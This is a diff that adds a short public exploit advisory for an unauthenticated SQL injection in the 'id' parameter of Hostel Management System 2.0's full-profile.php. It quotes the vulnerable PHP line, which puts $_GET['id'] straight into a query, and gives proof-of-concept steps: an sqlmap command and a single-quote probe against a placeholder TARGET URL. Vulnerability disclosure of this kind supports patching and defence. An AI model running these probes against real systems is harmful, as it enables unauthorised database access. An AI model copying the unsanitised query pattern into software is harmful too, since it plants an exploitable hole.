@@ -1,0 +1,20 @@
+# Exploit Title: Hostel Management System 2.0 - 'id' SQL Injection (Unauthenticated)
+# Date: 2020-06-02
+# Exploit Author: Selim Enes 'Enesdex' Karaduman
+# Vendor Homepage: https://phpgurukul.com/hostel-management-system/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=7210
+# Version: 2.0
+# Tested on: Windows 10 - Wamp Server
+
+--Vulnerable file /full-profile.php
+
+--Vulnerable code;
+    $ret= mysqli_query($con,"SELECT * FROM registration where emailid = '".$_GET['id']."'");
+
+    Id parameter's value is going into sql query directly!
+
+--Proof Of Concept 
+   
+   sqlmap -u "http://TARGET/hostel/full-profile.php?id=6" 
+   OR
+   http://TARGET/hostel/full-profile.php?id=6' Single Quote will cause SQL error
